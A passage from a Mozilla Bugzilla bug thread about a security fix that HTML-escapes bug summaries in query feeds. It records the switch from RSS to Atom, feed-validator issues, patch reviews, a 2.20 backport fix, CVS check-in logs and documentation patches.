Looks like Firefox doesn't like Atom. Any suggestion for a good Firefox extension?

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=313441#c25)• 19 years ago |
|  | |

Firefox WFM (at least, with type="text", it's bugged for type="html"): bookmarks manager, File, New Live Bookmark, add the sample URL and it works. How is it failing you?
The usual suspects for content, not just titles, are <http://sage.mozdev.org/> and <http://habarixenu.mozdev.org/> though <http://weblog.philringnalda.com/2005/12/05/telling-markup-from-text#comment-12005> says that both are buggy with type="text" titles.

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=313441#c26)• 19 years ago |
|  | |

(In reply to [comment #25](/show_bug.cgi?id=313441#c25 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> How is it failing you?
Clicking the link in [comment 23](/show_bug.cgi?id=313441#c23 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>") makes Firefox to download it, and dragging it in my Personal bar doesn't help. /me has Fx 1.5

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=313441#c27)• 19 years ago |
|  | |

(In reply to [comment #26](/show_bug.cgi?id=313441#c26 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> Clicking the link in [comment 23](/show_bug.cgi?id=313441#c23 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>") makes Firefox to download it
Oh, [bug 155730](/show_bug.cgi?id=155730 "NEW - Mozilla doesn't handle files served as */*+xml as XML files"). You aren't allowed to see application/atom+xml, or any \*/\*+xml. Add it as a Live Bookmark (self-plug: <http://weblog.philringnalda.com/firefox-extensions/livebookmarkthis/>) or download it and fool Firefox with a local file.

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=313441#c28)• 19 years ago |
|  | |

RFC 4287: The Atom Syndication FormatURL: [https://bugzilla.mozilla.org/buglist....](https://bugzilla.mozilla.org/buglist.cgi?query_format=advanced&bugidtype=include&bug_id=313418%2C%20313419&ctype=rss) → <http://ietf.org/rfc/rfc4287>Whiteboard: [doesn't affect 2.16, doesn't affect 2.18] → [doesn't affect 2.16][doesn't affect 2.18]

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=313441#c29)• 19 years ago |
|  | |

Comment on [attachment 205101](/attachment.cgi?id=205101 "Like so?") [[details]](/attachment.cgi?id=205101&action=edit "Like so?") [[diff]](/attachment.cgi?id=205101&action=diff "Like so?") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205101)
Like so?
There's only one problem with this patch: the feed for a bug list with one bug contains no entry for that bug, just a description of the feed itself, as if the search had returned no results. The RSS version displays the single item correctly, so this is a regression.
Fix that, and I'll grant review.
Note that if the list contains no bugs, feedvalidator.org complains that the feed's author element is missing. But I think feedvalidator is in the wrong here, since the rule from the RFC is:
o atom:feed elements MUST contain one or more atom:author elements,
unless all of the atom:feed element's child atom:entry elements
contain at least one atom:author element.
Per this rule, it seems to me that if there are no entries, you don't have to add an author to the feed itself, since all of the entry elements do contain an author element, even if "all" here is zero.
feedvalidator.org also complains that "title should not contain HTML unless declared in the type attribute" for bugs whose titles reference entities (f.e. &#1503;). But the validator is assuming incorrectly that the title contains HTML, when in fact it does not (the titles are plain text, and any HTML-like constructs are meant to be displayed literally).
[Attachment #205101](/attachment.cgi?id=205101&action=edit "Like so?") -
Flags: review?(myk) → review-

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=313441#c30)• 19 years ago |
|  | |

(In reply to [comment #29](/show_bug.cgi?id=313441#c29 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> There's only one problem with this patch: the feed for a bug list with one bug
> contains no entry for that bug
I'm astonished that it actually gave them all when n > 1 - I was foolishly popping off the latest bug to get the feed-level updated, I don't see why that doesn't take one off when there's more than one. If I understood Template Toolkit, I might say that was a bug in it.
> Note that if the list contains no bugs, feedvalidator.org complains that the
> feed's author element is missing. But I think feedvalidator is in the wrong
> here
Agreed, I'll fix it or file it. And since a Zarro Boogs feed can be useful, I'll file a bug on Bugzilla to move the "Feed" link out of the bugs.size > 0 section once this one's fixed.

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=313441#c31)• 19 years ago |
|  | |

>Agreed, I'll fix it or file it.
For what it's worth, the error suggested I mail the feedvalidator-users list if I disagreed with the message, so I have done so.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=313441#c32)• 19 years ago |
|  | |

Attached patch

[last, not pop](attachment.cgi?id=205369&action=diff)
— [Details](attachment.cgi?id=205369&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205369)

.last instead of .pop
Have to hope there aren't any clients that will be bothered by having the current date for feed/updated in an empty feed, since there's no way we can give the date when the contents of an empty feed actually changed.
[Attachment #205101](/attachment.cgi?id=205101&action=edit "Like so?") -
Attachment is obsolete: true
[Attachment #205369](/attachment.cgi?id=205369&action=edit "last, not pop") -
Flags: review?(myk)

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=313441#c33)• 19 years ago |
|  | |

The "Internal Server Error" I've gotten both times I added an attachment with a review flag set is a known bug with security flagged bugs, isn't it?

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=313441#c34)• 19 years ago |
|  | |

Comment on [attachment 205369](/attachment.cgi?id=205369 "last, not pop") [[details]](/attachment.cgi?id=205369&action=edit "last, not pop") [[diff]](/attachment.cgi?id=205369&action=diff "last, not pop") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205369)
last, not pop
Yup.
[Attachment #205369](/attachment.cgi?id=205369&action=edit "last, not pop") -
Flags: review?(myk) → review+

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=313441#c35)• 19 years ago |
|  | |

Phil, does your patch apply on both the tip and 2.20? If yes, can you request approval for both tip and 2.20 please and add [ready for 2.20.1][ready for 2.21.2] in the status whiteboard? Else a backport for 2.20 is required.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=313441#c36)• 19 years ago |
|  | |

Attached patch

[For 2\_20-Branch](attachment.cgi?id=205513&action=diff) (obsolete)
— [Details](attachment.cgi?id=205513&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205513)

Just some fuzz in the context.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a4220553_135518)• 19 years ago |

Flags: approval?Flags: approval2.20?Whiteboard: [doesn't affect 2.16][doesn't affect 2.18] → [doesn't affect 2.16][doesn't affect 2.18][ready for 2.20.1][ready for2.21.2]

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=313441#c37)• 19 years ago |
|  | |

Comment on [attachment 205513](/attachment.cgi?id=205513 "For 2_20-Branch") [[details]](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") [[diff]](/attachment.cgi?id=205513&action=diff "For 2_20-Branch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205513)
For 2\_20-Branch
backports need to be reviewed too.
[Attachment #205513](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") -
Flags: review?(myk)

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a4276371_27300)• 19 years ago |

[Attachment #205513](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") -
Flags: review?(myk) → review+

|  | [Max Kanat-Alexander](/user_profile?user_id=73187) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a4562526_73187)• 19 years ago |

Blocks: [320312](/show_bug.cgi?id=320312 "RESOLVED FIXED - Security Advisory for 2.16.11, 2.18.5, 2.20.1, and 2.22rc1")

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=313441#c38)• 19 years ago |
|  | |

This patch is now live on our QA installations, e.g. <http://landfill.bugzilla.org/qa220/> but neither Fx nor Tb can read the generated Atom feed, and it seems that FeedValidator doesn't accept that long uri.
Phil, could you do some tests at the URL above and let us know what's going on? I'm using Fx 1.5.0.1 and I could click the icon in the address bar and successfully add it to my bookmarks, but when opening this feed, I get the message: "Live Bookmark Feed failed to load".

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=313441#c39)• 19 years ago |
|  | |

Comment on [attachment 205513](/attachment.cgi?id=205513 "For 2_20-Branch") [[details]](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") [[diff]](/attachment.cgi?id=205513&action=diff "For 2_20-Branch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205513)
For 2\_20-Branch
>Index: template/en/default/list/list.atom.tmpl
>+<?xml version="1.0"[% IF Param('utf8') %] encoding="UTF-8"[% END %]?>
Here is the reason why it doesn't work: utf8 doesn't exist on 2.20:
"undef error - Can't find param named utf8 at Bugzilla/Config.pm line 151."
[Attachment #205513](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") -
Flags: review-

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=313441#c40)• 19 years ago |
|  | |

(In reply to [comment #39](/show_bug.cgi?id=313441#c39 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> >+<?xml version="1.0"[% IF Param('utf8') %] encoding="UTF-8"[% END %]?>
Replacing this line by: <?xml version="1.0"?> fixes the problem. This change is now applied on our QA installation for 2.20.
Phil, please post a new patch with this change.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=313441#c41)• 19 years ago |
|  | |

Arrgh! Next problem: the very first feed I validated with real data (try validating searches from "Find a Specific Bug", they're shorter URLs) gives us a warning that "name should not be blank" from a reporter without a realname. What do we want to use in that case? Is the username from the email that's used for flags already available to me there? And do we already have a routine to strip empty parameters from query URLs that we could use on the feed URL? The validator's far from the only thing that enforces a needless 255 character limit on URLs.

|  | [Phil Ringnalda (:philor)](/user_profile?user_id=135518)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=313441#c42)• 19 years ago |
|  | |

Attached patch

[2\_20-Branch v2](attachment.cgi?id=208257&action=diff)
— [Details](attachment.cgi?id=208257&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=208257)

Any client which treats an XML decl without an encoding when the file was sent as application/atom+xml as any different than having a hardcoded |encoding="UTF-8"| is utterly broken, anyway.
[Attachment #205513](/attachment.cgi?id=205513&action=edit "For 2_20-Branch") -
Attachment is obsolete: true
[Attachment #208257](/attachment.cgi?id=208257&action=edit "2_20-Branch v2") -
Flags: review?(myk)

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=313441#c43)• 19 years ago |
|  | |

Comment on [attachment 208257](/attachment.cgi?id=208257 "2_20-Branch v2") [[details]](/attachment.cgi?id=208257&action=edit "2_20-Branch v2") [[diff]](/attachment.cgi?id=208257&action=diff "2_20-Branch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=208257)
2\_20-Branch v2
This change is already applied on our QA installation for 2.20 and works with Fx and Tb. r=LpSolit
[Attachment #208257](/attachment.cgi?id=208257&action=edit "2_20-Branch v2") -
Flags: review+

|  | [Myk Melez [:myk] [@mykmelez]](/user_profile?user_id=27300) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a7662427_27300)• 19 years ago |

[Attachment #208257](/attachment.cgi?id=208257&action=edit "2_20-Branch v2") -
Flags: review?(myk) → review+

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a10257413_120380)• 19 years ago |

Version: unspecified → 2.20

|  | [Dave Miller [:justdave]](/user_profile?user_id=10297) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a10429797_10297)• 19 years ago |

Flags: approval?Flags: approval2.20?Flags: approval2.20+Flags: approval+

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=313441#c44)• 19 years ago |
|  | |

tip:
Checking in buglist.cgi;
/cvsroot/mozilla/webtools/bugzilla/buglist.cgi,v <-- buglist.cgi
new revision: 1.325; previous revision: 1.324
done
Checking in Bugzilla/Constants.pm;
/cvsroot/mozilla/webtools/bugzilla/Bugzilla/Constants.pm,v <-- Constants.pm
new revision: 1.34; previous revision: 1.33
done
Checking in template/en/default/global/header.html.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/global/header.html.tmpl,v <-- header.html.tmpl
new revision: 1.40; previous revision: 1.39
done
RCS file: /cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.atom.tmpl,v
done
Checking in template/en/default/list/list.atom.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.atom.tmpl,v <-- list.atom.tmpl
initial revision: 1.1
done
Checking in template/en/default/list/list.html.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.html.tmpl,v <-- list.html.tmpl
new revision: 1.46; previous revision: 1.45
done
Removing template/en/default/list/list.rss.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.rss.tmpl,v <-- list.rss.tmpl
new revision: delete; previous revision: 1.5
done
2.20:
Checking in buglist.cgi;
/cvsroot/mozilla/webtools/bugzilla/buglist.cgi,v <-- buglist.cgi
new revision: 1.299.2.10; previous revision: 1.299.2.9
done
Checking in Bugzilla/Constants.pm;
/cvsroot/mozilla/webtools/bugzilla/Bugzilla/Constants.pm,v <-- Constants.pm
new revision: 1.25.2.2; previous revision: 1.25.2.1
done
Checking in template/en/default/global/header.html.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/global/header.html.tmpl,v <-- header.html.tmpl
new revision: 1.39.4.1; previous revision: 1.39
done
Checking in template/en/default/list/list.atom.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.atom.tmpl,v <-- list.atom.tmpl
new revision: 1.1.2.2; previous revision: 1.1.2.1
done
Checking in template/en/default/list/list.html.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/list.html.tmpl,v <-- list.html.tmpl
new revision: 1.37.2.2; previous revision: 1.37.2.1
done
Removing template/en/default/list/list.rss.tmpl;
/cvsroot/mozilla/webtools/bugzilla/template/en/default/list/Attic/list.rss.tmpl,v <-- list.rss.tmpl
new revision: delete; previous revision: 1.2.2.1
done
Status: ASSIGNED → RESOLVEDClosed: 19 years agoResolution: --- → FIXED

|  | [Max Kanat-Alexander](/user_profile?user_id=73187) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=313441#c45)• 19 years ago |
|  | |

Security Advisory posted; unlocking bug.Group: webtools-security

|  | [victory <never@receive.bug.mails.i.hate.spammer>](/user_profile?user_id=162556) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=313441#c46)• 19 years ago |
|  | |

Attached patch

[docs patch for tip v1 about my comment](attachment.cgi?id=213434&action=diff)
— [Details](attachment.cgi?id=213434&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=213434)

now Bugzilla feed is Atom, not RSS 1.0
[Attachment #213434](/attachment.cgi?id=213434&action=edit "docs patch for tip v1 about my comment") -
Flags: review?(documentation)

|  | [timeless](/user_profile?user_id=15223) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a11098836_15223)• 19 years ago |

[Attachment #213434](/attachment.cgi?id=213434&action=edit "docs patch for tip v1 about my comment") -
Flags: review?(documentation) → review+

|  | [victory <never@receive.bug.mails.i.hate.spammer>](/user_profile?user_id=162556) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=313441#c47)• 19 years ago |
|  | |

Attached patch

[other docs patch for 2.20](attachment.cgi?id=219117&action=diff)
— [Details](attachment.cgi?id=219117&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=219117)

[Attachment #219117](/attachment.cgi?id=219117&action=edit "other docs patch for 2.20") -
Flags: review?(documentation)

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a15772790_120380)• 19 years ago |

Summary: Query RSS should HTML-escape summary in <title> → [SECURITY] Query RSS should HTML-escape summary in <title>

|  | [Max Kanat-Alexander](/user_profile?user_id=73187) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a15784321_73187)• 19 years ago |

[Attachment #219117](/attachment.cgi?id=219117&action=edit "other docs patch for 2.20") -
Flags: review?(documentation) → review+

|  | [Max Kanat-Alexander](/user_profile?user_id=73187) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a39349551_73187)• 18 years ago |

Blocks: [314659](/show_bug.cgi?id=314659 "RESOLVED FIXED - Provide more information for the Atom summary")

|  | [Frédéric Buclin](/user_profile?user_id=120380) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=313441#a39362874_120380)• 18 years ago |

Blocks: [367674](/show_bug.cgi?id=367674 "RESOLVED FIXED - [SECURITY] XSS when reading Atom feeds due to unescaped HTML")
You need to [log in](/show_bug.cgi?id=313441&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Phil Ringnalda (:philor)](/user_profile?user_id=135518)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


